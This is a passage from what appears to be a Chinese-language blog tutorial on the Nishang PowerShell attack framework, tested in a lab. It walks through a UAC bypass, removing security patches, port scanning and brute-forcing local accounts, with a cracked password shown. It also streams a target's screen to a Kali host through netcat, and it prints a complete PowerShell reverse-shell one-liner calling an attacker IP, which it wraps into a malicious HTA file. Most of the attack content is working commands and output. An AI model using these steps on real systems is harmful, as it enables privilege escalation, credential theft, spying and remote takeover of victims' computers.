<p><strong>特别说明</strong>！实际上 UAC 拖到最顶部，也就是所有 UAC 通知都显示 UAC 提示窗口才是真的在利用 UAC 保护你的电脑。因为 Windows 7 开始新增的两个中间级别都是在部分情况下静默提权，而这两种级别因为可以静默提权，所以也可以很容易被程序绕过。微软认为绕过 UAC 弹窗不是漏洞，因为这是用户自己的选择——如果用户选择全部通知是不会绕过的，用户选择了默认值，于是才可以绕过。所以这里推荐大家使用 UAC 的最高档，也就是全部提权都通知，这可以让大多数绕过 UAC 的方法失效。</p>
<p>在Nishang中主要是利用<code>Invoke-PsUACme</code>脚本进行利用的，而这个脚本是基于<code>UACME</code>项目进行编写的，具体利用过程可以看下：http://www.fuzzysecurity.com/tutorials/27.html</p>
<p>由于Windows 10会提不支持/extract选项，测试环境就换到Windows 7进行测试，我们在Windows 7上执行<code>regedit</code>是会被uac提示的：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">sc92n</span><span class="p">&gt;</span><span class="n">regedit</span>
</span></span><span class="line"><span class="cl"><span class="n">Access</span> <span class="n">is</span> <span class="n">denied</span><span class="p">.</span>
</span></span></code></pre></div><p>所以我们利用Nishang里面的脚本<code>Invoke-PsUACme</code>进行bypass：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">win</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">nishang</span><span class="p">\</span><span class="n">Escalation</span><span class="p">&gt;</span> <span class="nb">Invoke-PsUACme</span> <span class="n">-Verbose</span> <span class="c">#利用失败</span>
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">win</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">nishang</span><span class="p">\</span><span class="n">Escalation</span><span class="p">&gt;</span> <span class="nb">Invoke-PsUACme</span> <span class="n">-method</span> <span class="n">oobe</span> <span class="n">-Verbose</span> <span class="c">#成功利用</span>
</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//21.png" alt="21"></p>
<h3 id="删除补丁">删除补丁</h3>
<p>这个脚本可以帮助删除系统补丁，补丁可以用来修复系统漏洞等一系列漏洞问题，如果删除补丁就可能造成系统漏洞的再次利用：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Remove-Update All 移除目标机器上的所有补丁
</span></span><span class="line"><span class="cl">Remove-Update Security 移除目标机器上所有安全补丁
</span></span><span class="line"><span class="cl">Remove-Update KB2761226 移除指定编号的补丁
</span></span></code></pre></div><p>其实这个感觉用户不是很大吧，我们一般都会通过检查没有打补丁然后进行提权利用，这个估计会在后门上面会用处大一点,不过删除补丁这个功能还是比较新颖的。</p>
<h2 id="其他功能">其他功能</h2>
<h3 id="端口扫描">端口扫描</h3>
<p><code>Invoke-PortScan</code>对目标机器环境中的其他主机和端口进行枚举破解：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-StartAddress 开始的IP地址
</span></span><span class="line"><span class="cl">-EndAddress 结束的IP地址
</span></span><span class="line"><span class="cl">-ResolveHost 是否解析主机名
</span></span><span class="line"><span class="cl">-ScanPort要不要进行端口扫描
</span></span><span class="line"><span class="cl">-Port 要扫描的端口（默认很多，看上图）
</span></span><span class="line"><span class="cl">-TimeOut 超时时间
</span></span></code></pre></div><p>本地测试对172.16.0.100-172.16.0.150进行扫描：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">sc92n</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">&gt;</span> <span class="nb">Invoke-PortScan</span> <span class="n">-StartA</span>
</span></span><span class="line"><span class="cl"><span class="n">ddress</span> <span class="mf">172.16</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">100</span> <span class="n">-EndAddress</span> <span class="mf">172.16</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">150</span> <span class="n">-ResolveHost</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">IPAddress</span>    <span class="n">HostName</span>                 <span class="n">Ports</span>
</span></span><span class="line"><span class="cl"><span class="p">---------</span>    <span class="p">--------</span>                 <span class="p">-----</span>
</span></span><span class="line"><span class="cl"><span class="mf">172.16</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">102</span> <span class="nb">MACBOOKPRO-ABE9</span>
</span></span><span class="line"><span class="cl"><span class="mf">172.16</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">105</span> <span class="nb">WIN-xxx</span><span class="p">.</span><span class="py">hack</span><span class="p">.</span><span class="py">lab</span>
</span></span><span class="line"><span class="cl"><span class="mf">172.16</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">106</span> <span class="n">DC</span><span class="p">.</span><span class="py">hack</span><span class="p">.</span><span class="py">lab</span>
</span></span></code></pre></div><p>扫描开放3389端口的机器：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">sc92n</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">&gt;</span> <span class="nb">Invoke-PortScan</span> <span class="n">-StartA</span>
</span></span><span class="line"><span class="cl"><span class="n">ddress</span> <span class="mf">172.16</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">100</span> <span class="n">-EndAddress</span> <span class="mf">172.16</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">150</span> <span class="n">-ResolveHost</span> <span class="n">-ScanPort</span> <span class="n">-Port</span> <span class="mf">3389</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">IPAddress</span>    <span class="n">HostName</span>                 <span class="n">Ports</span>
</span></span><span class="line"><span class="cl"><span class="p">---------</span>    <span class="p">--------</span>                 <span class="p">-----</span>
</span></span><span class="line"><span class="cl"><span class="mf">172.16</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">102</span> <span class="nb">MACBOOKPRO-ABE9</span>          <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="mf">172.16</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">105</span> <span class="nb">WIN-xxx</span><span class="p">.</span><span class="py">hack</span><span class="p">.</span><span class="py">lab</span>         <span class="p">{</span><span class="mf">3389</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="mf">172.16</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">106</span> <span class="n">DC</span><span class="p">.</span><span class="py">hack</span><span class="p">.</span><span class="py">lab</span>              <span class="p">{</span><span class="mf">3389</span><span class="p">}</span>
</span></span></code></pre></div><h3 id="弱口令爆破">弱口令爆破</h3>
<p>使用的脚本是<code>Invoke-BruteForce</code>,下面是命令详解：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ComputerName 用于指定对应服务的计算机名
</span></span><span class="line"><span class="cl">UserList 用户名字典
</span></span><span class="line"><span class="cl">PasswordList 密码字典
</span></span><span class="line"><span class="cl">Service 服务类型（注意默认为：SQL）
</span></span><span class="line"><span class="cl">StopOnSuccess 成功找到一个之后就停止执行
</span></span></code></pre></div><p>网上和书中写的比较模糊，我们看下脚本的例子来实际操作一下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">SYNOPSIS</span>
</span></span><span class="line"><span class="cl">    <span class="n">Nishang</span> <span class="n">payload</span> <span class="n">which</span> <span class="n">performs</span> <span class="n">a</span> <span class="nb">Brute-Force</span> <span class="n">Attack</span> <span class="n">against</span> <span class="n">SQL</span> <span class="n">Server</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">Active</span> <span class="n">Directory</span><span class="p">,</span> <span class="n">Local</span> <span class="n">Accounts</span><span class="p">,</span> <span class="n">Web</span> <span class="n">and</span> <span class="n">FTP</span><span class="p">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">--------------------------</span> <span class="n">EXAMPLE</span> <span class="mf">1</span> <span class="p">--------------------------</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">PS </span><span class="p">&gt;</span><span class="nb">Invoke-BruteForce</span> <span class="n">-ComputerName</span> <span class="n">SQLServ01</span> <span class="n">-UserList</span> <span class="n">C:</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">users</span><span class="p">.</span><span class="py">txt</span>
</span></span><span class="line"><span class="cl">    <span class="n">-PasswordList</span> <span class="n">C:</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">wordlist</span><span class="p">.</span><span class="py">txt</span> <span class="n">-Service</span> <span class="n">SQL</span> <span class="n">-Verbose</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">Brute</span> <span class="n">force</span> <span class="n">a</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="n">SQLServ01</span> <span class="k">for</span> <span class="n">users</span> <span class="n">listed</span> <span class="k">in</span> <span class="n">users</span><span class="p">.</span><span class="py">txt</span> <span class="n">and</span>
</span></span><span class="line"><span class="cl">    <span class="n">passwords</span> <span class="k">in</span> <span class="n">wordlist</span><span class="p">.</span><span class="py">txt</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">--------------------------</span> <span class="n">EXAMPLE</span> <span class="mf">2</span> <span class="p">--------------------------</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">PS </span><span class="p">&gt;</span><span class="nb">Invoke-BruteForce</span> <span class="n">-ComputerName</span> <span class="n">targetdomain</span><span class="p">.</span><span class="py">com</span> <span class="n">-UserList</span>
</span></span><span class="line"><span class="cl">    <span class="n">C:</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">users</span><span class="p">.</span><span class="py">txt</span> <span class="n">-PasswordList</span> <span class="n">C:</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">wordlist</span><span class="p">.</span><span class="py">txt</span> <span class="n">-Service</span>
</span></span><span class="line"><span class="cl">    <span class="n">ActiveDirectory</span> <span class="n">-StopOnSuccess</span> <span class="n">-Verbose</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">Brute</span> <span class="n">force</span> <span class="n">a</span> <span class="n">Domain</span> <span class="n">Controller</span> <span class="n">of</span> <span class="n">targetdomain</span><span class="p">.</span><span class="py">com</span> <span class="k">for</span> <span class="n">users</span> <span class="n">listed</span> <span class="k">in</span>
</span></span><span class="line"><span class="cl">    <span class="n">users</span><span class="p">.</span><span class="py">txt</span> <span class="n">and</span> <span class="n">passwords</span> <span class="k">in</span> <span class="n">wordlist</span><span class="p">.</span><span class="py">txt</span><span class="p">.</span>
</span></span><span class="line"><span class="cl">    <span class="n">Since</span> <span class="n">StopOnSuccess</span> <span class="n">is</span> <span class="n">specified</span><span class="p">,</span> <span class="n">the</span> <span class="n">brute</span> <span class="n">forcing</span> <span class="n">stops</span> <span class="n">on</span> <span class="n">first</span> <span class="n">success</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">--------------------------</span> <span class="n">EXAMPLE</span> <span class="mf">3</span> <span class="p">--------------------------</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">PS </span><span class="p">&gt;</span><span class="nb">Invoke-BruteForce</span> <span class="n">-ComputerName</span> <span class="n">targetmachine</span> <span class="n">-UserList</span>
</span></span><span class="line"><span class="cl">    <span class="n">C:</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">users</span><span class="p">.</span><span class="py">txt</span> <span class="n">-PasswordList</span> <span class="n">C:</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">wordlist</span><span class="p">.</span><span class="py">txt</span> <span class="n">-Service</span>
</span></span><span class="line"><span class="cl">    <span class="n">LocalAccounts</span> <span class="n">-StopOnSuccess</span> <span class="n">-Verbose</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">Brute</span> <span class="n">force</span> <span class="n">the</span> <span class="n">local</span> <span class="n">mahcine</span> <span class="k">for</span> <span class="n">local</span> <span class="n">users</span> <span class="n">listed</span> <span class="k">in</span> <span class="n">users</span><span class="p">.</span><span class="py">txt</span> <span class="n">and</span>
</span></span><span class="line"><span class="cl">    <span class="n">passwords</span> <span class="k">in</span> <span class="n">wordlist</span><span class="p">.</span><span class="py">txt</span><span class="p">.</span>
</span></span><span class="line"><span class="cl">    <span class="n">Since</span> <span class="n">StopOnSuccess</span> <span class="n">is</span> <span class="n">specified</span><span class="p">,</span> <span class="n">the</span> <span class="n">brute</span> <span class="n">forcing</span> <span class="n">stops</span> <span class="n">on</span> <span class="n">first</span> <span class="n">success</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">--------------------------</span> <span class="n">EXAMPLE</span> <span class="mf">4</span> <span class="p">--------------------------</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">PS </span><span class="p">&gt;</span><span class="nb">cat </span><span class="n">C:</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">servers</span><span class="p">.</span><span class="py">txt</span> <span class="p">|</span> <span class="nb">Invoke-BruteForce</span> <span class="n">-UserList</span>
</span></span><span class="line"><span class="cl">    <span class="n">C:</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">users</span><span class="p">.</span><span class="py">txt</span> <span class="n">-PasswordList</span> <span class="n">C:</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">wordlist</span><span class="p">.</span><span class="py">txt</span> <span class="n">-Service</span> <span class="n">SQL</span> <span class="n">-Verbose</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">Brute</span> <span class="n">force</span> <span class="n">SQL</span> <span class="n">Service</span> <span class="n">on</span> <span class="n">all</span> <span class="n">the</span> <span class="n">servers</span> <span class="n">specified</span> <span class="k">in</span> <span class="n">servers</span><span class="p">.</span><span class="py">txt</span>
</span></span></code></pre></div><p>我们选用EXAMPLE 3来测试一下，新建<code>users.txt</code>和<code>wordlist.txt</code>文件，里面写上需要爆破的用户名和密码，然后执行：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">sc92n</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">&gt;</span> <span class="nb">Invoke-BruteForce</span> <span class="n">-ComputerName</span> <span class="nb">WIN-JH8N3KV3OQ0</span> <span class="n">-UserList</span> <span class="n">users</span><span class="p">.</span><span class="py">txt</span> <span class="n">PasswordList</span> <span class="n">wordlist</span><span class="p">.</span><span class="py">txt</span> <span class="n">-Service</span> <span class="n">LocalAccounts</span> <span class="n">-StopOnSuccess</span> <span class="n">-Verbose</span> <span class="n">-Delay</span> <span class="mf">0.3</span>
</span></span><span class="line"><span class="cl"><span class="n">VERBOSE</span><span class="err">:</span> <span class="n">Starting</span> <span class="nb">Brute-Force</span> <span class="n">with</span> <span class="n">a</span> <span class="n">Delay</span> <span class="n">of</span> <span class="mf">0</span> <span class="n">and</span> <span class="n">Jitter</span> <span class="mf">0.3</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="n">Brute</span> <span class="n">Forcing</span> <span class="n">Local</span> <span class="n">Accounts</span> <span class="nb">WIN-JH8N3KV3OQ0</span>
</span></span><span class="line"><span class="cl"><span class="n">VERBOSE</span><span class="err">:</span> <span class="n">Checking</span> <span class="n">sc92n</span> <span class="err">:</span> <span class="n">p</span><span class="nv">@ssw0rd</span> <span class="p">(</span><span class="n">then</span> <span class="n">sleeping</span> <span class="k">for</span> <span class="mf">0</span> <span class="n">seconds</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">Match</span> <span class="n">found</span><span class="p">!</span> <span class="n">sc92n</span> <span class="err">:</span> <span class="n">p</span><span class="nv">@ssw0rd</span>
</span></span></code></pre></div><p>可以看到已经爆破成功了。</p>
<h3 id="嗅探待完善">嗅探（待完善）</h3>
<p>这个功能我记得以前2008年的时候，很多黑客论坛都被一个团队利用NetFuke工具进行ARP欺骗等方式，在当时感觉特别牛，都是老脚本小子了。我们在嗅探中除了上面的Netfuke还有大名鼎鼎的cain、Ettercap等。里面有用到一个技术就是中间人攻击，可以看下这篇文章科普一下：https://blog.csdn.net/tangCprogranm/article/details/84558652 ，现在基本很少了，因为各大公司都引入了IDS、防火墙、严格划分VLAN等措施。</p>
<p>但是Nishang这个模块Invoke-Interceptor不像是一种很好的嗅探</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Invoke-Interceptor -ProxyServer 172.16.0.107 -ProxyPort 9999
</span></span></code></pre></div><h3 id="屏幕窃取">屏幕窃取</h3>
<p>使用的是<code>Show-TargetScreen</code>模块，这个模块分为正向连接和反向连接，主要功能就是用来实时监控目标主机的屏幕。</p>
<p>参数：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-IPAddress 后面加IP地址（反向链接需要）
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-Port 加端口
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-Bind 正向连接
</span></span></code></pre></div><ol>
<li>
<p>反向连接</p>
<p>在目标主机执行：</p>
</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Show-TargetScreen</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="mf">172.16</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">107</span> <span class="n">-Port</span> <span class="mf">3333</span>
</span></span></code></pre></div><blockquote>
<p>172.16.0.107是kali的IP，意思就是把本机的屏幕数据发送到172.16.0.107的333端口上</p>
</blockquote>
<p>在Kali执行：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">netcat -nlvp <span class="m">3333</span> <span class="p">|</span> netcat -nlvp <span class="m">9999</span>
</span></span></code></pre></div><blockquote>
<p>意思就是把3333端口的数据转发到本地的9999端口</p>
</blockquote>
<p>我们可以在浏览器输入127.0.0.1:9999看到实时的屏幕：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//22.png" alt="22"></p>
<ol start="2">
<li>
<p>正向连接</p>
<p>目标主机执行：</p>
</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Show-TargetScreen</span> <span class="n">-Bind</span> <span class="n">-Port</span> <span class="mf">3333</span>
</span></span></code></pre></div><p>​       在Kali上执行：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">netcat -nv 172.16.0.106 <span class="m">3333</span> <span class="p">|</span> netcat -lnvp <span class="m">9999</span>
</span></span></code></pre></div><blockquote>
<p>106是目标主机的IP</p>
</blockquote>
<p>结果跟上面的一样，在Kali浏览器输入127.0.0.1:9999看到实时的屏幕。</p>
<h3 id="生成木马">生成木马</h3>
<p>Nishang可以生成各式各样的客户端，我们可以在<code>client</code>目录下看到有以下几种类型：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="n">Client</span><span class="p">&gt;</span> <span class="nb">dir
</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
</span></span><span class="line"><span class="cl"><span class="p">----</span>                <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>        <span class="mf">2021</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">23</span>     <span class="mf">22</span><span class="err">:</span><span class="mf">49</span>          <span class="mf">19502</span> <span class="nb">Out-CHM</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>        <span class="mf">2021</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">23</span>     <span class="mf">22</span><span class="err">:</span><span class="mf">49</span>          <span class="mf">19112</span> <span class="nb">Out-Excel</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>        <span class="mf">2021</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">23</span>     <span class="mf">22</span><span class="err">:</span><span class="mf">49</span>           <span class="mf">5265</span> <span class="nb">Out-HTA</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>        <span class="mf">2021</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">23</span>     <span class="mf">22</span><span class="err">:</span><span class="mf">49</span>           <span class="mf">7077</span> <span class="nb">Out-Java</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>        <span class="mf">2021</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">23</span>     <span class="mf">22</span><span class="err">:</span><span class="mf">49</span>           <span class="mf">2910</span> <span class="nb">Out-JS</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>        <span class="mf">2021</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">23</span>     <span class="mf">22</span><span class="err">:</span><span class="mf">49</span>           <span class="mf">1692</span> <span class="nb">Out-SCF</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>        <span class="mf">2021</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">23</span>     <span class="mf">22</span><span class="err">:</span><span class="mf">49</span>           <span class="mf">3517</span> <span class="nb">Out-SCT</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>        <span class="mf">2021</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">23</span>     <span class="mf">22</span><span class="err">:</span><span class="mf">49</span>           <span class="mf">4336</span> <span class="nb">Out-Shortcut</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>        <span class="mf">2021</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">23</span>     <span class="mf">22</span><span class="err">:</span><span class="mf">49</span>           <span class="mf">3183</span> <span class="nb">Out-WebQuery</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>        <span class="mf">2021</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">23</span>     <span class="mf">22</span><span class="err">:</span><span class="mf">49</span>          <span class="mf">17660</span> <span class="nb">Out-Word</span><span class="p">.</span><span class="py">ps1</span>
</span></span></code></pre></div><p>因为我测试环境的目标主机没有安装Office，所以采用HTA的方式进行测试,我们先找一个shell的代码，在<code>shells</code>目录下的<code>Invoke-PowerShellTcpOneLine.ps1</code>文件，里面有一行代码,修改端口和IP后删除其他行的内容后保存文件：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"> <span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Net</span><span class="p">.</span><span class="py">Sockets</span><span class="p">.</span><span class="py">TCPClient</span><span class="p">(</span><span class="s1">&#39;172.16.0.107&#39;</span><span class="p">,</span><span class="mf">4444</span><span class="p">);</span><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="py">GetStream</span><span class="p">();[</span><span class="no">byte[]</span><span class="p">]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="mf">0</span><span class="p">.</span><span class="mf">.65535</span><span class="p">|%{</span><span class="mf">0</span><span class="p">};</span><span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="py">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="mf">0</span><span class="p">){;</span><span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="py">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="py">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="mf">2</span><span class="p">&gt;&amp;</span><span class="mf">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span><span class="nv">$sendback2</span>  <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s1">&#39;PS &#39;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="py">Path</span> <span class="p">+</span> <span class="s1">&#39;&gt; &#39;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">([</span><span class="no">text.encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">).</span><span class="py">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="py">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="py">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="p">.</span><span class="py">Close</span><span class="p">()</span>
</span></span></code></pre></div><p>在Kali执行监听：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ nc -lnvp <span class="m">4444</span> 
</span></span></code></pre></div><p>然后在Windows 主机执行：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">win10</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Out-HTA</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">win10</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">Out-HTA</span> <span class="n">-PayloadScript</span> <span class="p">.\</span><span class="nb">Invoke-PowerShellTcpOneLine</span><span class="p">.</span><span class="py">ps1</span> <span class="n">-HTAFilePath</span> <span class="p">./</span><span class="mf">1</span><span class="p">.</span><span class="py">hta</span>
</span></span><span class="line"><span class="cl"><span class="n">HTA</span> <span class="n">written</span> <span class="n">to</span> <span class="p">./</span><span class="mf">1</span><span class="p">.</span><span class="py">hta</span><span class="p">.</span>
</span></span></code></pre></div><p>再运行一下<code>1.hta</code>文件即可看到主机已经上线：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ nc -lnvp <span class="m">4444</span>                                                                                                                                                                                             
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
